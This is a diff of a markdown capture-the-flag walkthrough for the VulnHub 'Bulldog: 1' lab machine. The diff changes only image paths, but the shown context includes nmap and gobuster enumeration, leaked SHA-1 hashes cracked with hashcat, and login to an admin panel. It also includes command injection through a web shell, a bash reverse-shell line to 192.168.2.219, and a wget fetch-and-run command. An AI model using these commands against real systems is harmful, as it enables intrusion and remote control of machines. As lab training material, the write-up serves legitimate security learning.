@@ -3,7 +3,7 @@
 - **Machine:** Bulldog: 1
 - **Download:** https://www.vulnhub.com/entry/bulldog-1,211/
 
-![](834-1.png)
+![](images/834-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](834-2.png)
+![](images/834-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Run a comprehensive Nmap scan to enumerate all open ports, services, operating s
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.166
 ```
 
-![](834-3.png)
+![](images/834-3.png)
 
 ---
 
@@ -59,7 +59,7 @@ This command performs an aggressive scan and uses the `http-enum` NSE script to 
 nmap -v -p 80,8080 -sT -sV -A --script=http-enum.nse 192.168.2.166
 ```
 
-![](834-4.png)
+![](images/834-4.png)
 
 ---
 
@@ -82,7 +82,7 @@ Perform directory brute-forcing against the `/dev` directory.
 gobuster dir -u http://192.168.2.166/dev -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,bak
 ```
 
-![](834-5.png)
+![](images/834-5.png)
 
 ---
 
@@ -90,7 +90,7 @@ gobuster dir -u http://192.168.2.166/dev -w /usr/share/seclists/Discovery/Web-Co
 
 Review the page source for sensitive information.
 
-![](834-6.png)
+![](images/834-6.png)
 
 ### Email Addresses and SHA-1 Hashes
 
@@ -110,7 +110,7 @@ sarah@bulldogindustries.com  : d8b8dd5e7f000b8dea26ef8428caf38c04466b3e
 nano hashes.txt
 ```
 
-![](834-7.png)
+![](images/834-7.png)
 
 ---
 
@@ -122,7 +122,7 @@ Use Hashcat to recover passwords from the discovered SHA-1 hashes.
 hashcat -m 100 hashes.txt /opt/rockyou.txt
 ```
 
-![](834-8.png)
+![](images/834-8.png)
 
 Only two hashes are successfully cracked.
 
@@ -150,7 +150,7 @@ Continue enumerating the web root.
 gobuster dir -u http://192.168.2.166 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x py,txt,html
 ```
 
-![](834-9.png)
+![](images/834-9.png)
 
 ---
 
@@ -160,7 +160,7 @@ Visit:
 
 - http://192.168.2.166/admin/
 
-![](834-10.png)
+![](images/834-10.png)
 
 ### Valid Credentials
 
@@ -169,7 +169,7 @@ Username : nick
 Password : bulldog
 ```
 
-![](834-11.png)
+![](images/834-11.png)
 
 Successfully authenticate to the administrative interface.
 
@@ -181,7 +181,7 @@ Browse to:
 
 - http://192.168.2.166/dev/shell/
 
-![](834-12.png)
+![](images/834-12.png)
 
 Verify command execution.
 
@@ -193,9 +193,9 @@ pwd
 ls -lh
 ```
 
-![](834-13.png)
+![](images/834-13.png)
 
-![](834-14.png)
+![](images/834-14.png)
 
 ---
 
@@ -227,7 +227,7 @@ Installed Apps      : Default Django applications
 ls bulldog
 ```
 
-![](834-15.png)
+![](images/834-15.png)
 
 ---
 
@@ -243,7 +243,7 @@ Ensure the target system has the required tools and that `/tmp` is writable.
 pwd && which wget && which chmod && which bash && cd /tmp && pwd && ls -la
 ```
 
-![](834-16.png)
+![](images/834-16.png)
 
 This confirms that `wget`, `chmod`, and `bash` are available and that files can be written to `/tmp`.
 
@@ -261,7 +261,7 @@ Add the following content:
 bash -i >& /dev/tcp/192.168.2.219/443 0>&1
 ```
 
-![](834-17.png)
+![](images/834-17.png)
 
 ---
 
@@ -291,7 +291,7 @@ Run the following command through the web shell.
 pwd && cd /tmp && wget http://192.168.2.219:8080/reverse_shell.sh && chmod +x reverse_shell.sh && bash reverse_shell.sh
 ```
 
-![](834-18.png)
+![](images/834-18.png)
 
 ---
 
@@ -299,7 +299,7 @@ pwd && cd /tmp && wget http://192.168.2.219:8080/reverse_shell.sh && chmod +x re
 
 A reverse shell is successfully established.
 
-![](834-19.png)
+![](images/834-19.png)
 
 ---
 
